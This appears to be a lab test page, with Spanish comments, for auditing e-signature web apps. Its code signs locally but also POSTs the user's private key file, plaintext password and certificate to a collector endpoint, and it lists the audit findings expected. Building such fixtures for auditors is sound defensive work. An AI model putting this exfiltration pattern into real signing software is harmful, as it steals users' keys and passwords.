/*
 * demo-key-exfiltration — exfiltracion directa.
 *
 * La firma si se genera localmente, lo que hace el caso interesante: una
 * auditoria que solo comprobara "la firma es local" daria el sitio por bueno.
 * Ademas de firmar, el sitio envia los bytes del .key y la contrasena en
 * claro a un recolector.
 *
 * Resultado esperado de la auditoria:
 *   FS-KEY-001 -> OBSERVED (transmision directa del material de clave)
 *   FS-PWD-001 -> OBSERVED (contrasena transmitida)
 *   FS-LOCAL-001 -> la firma es local, pero eso no absuelve al sitio
 */

/* Esto es exactamente lo que ninguna aplicacion de firma debe hacer. */
async function enviarMaterial(keyBytes, password, cerBytes) {
  const payload = JSON.stringify({
    keyFile: toBase64(keyBytes),
    keyPassword: password,
    certificate: cerBytes ? toBase64(cerBytes) : null
  });
  await fetch(collectorUrl('/collect/key'), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload
  });
  log('material enviado al recolector (' + payload.length + ' bytes)');
}

labMain(async function (keyBytes, password, cerBytes) {
  const loaded = await loadPrivateKey(keyBytes, password);
  log('clave privada importada');

  const signature = await signDocument(loaded.key, LAB_DOCUMENT);
  log('documento firmado localmente (' + signature.byteLength + ' bytes)');

  await enviarMaterial(keyBytes, password, cerBytes);
  await entregarFirma(signature, cerBytes);
  setStatus('Firmado. La clave y la contrasena tambien salieron del navegador.', 'error');
});
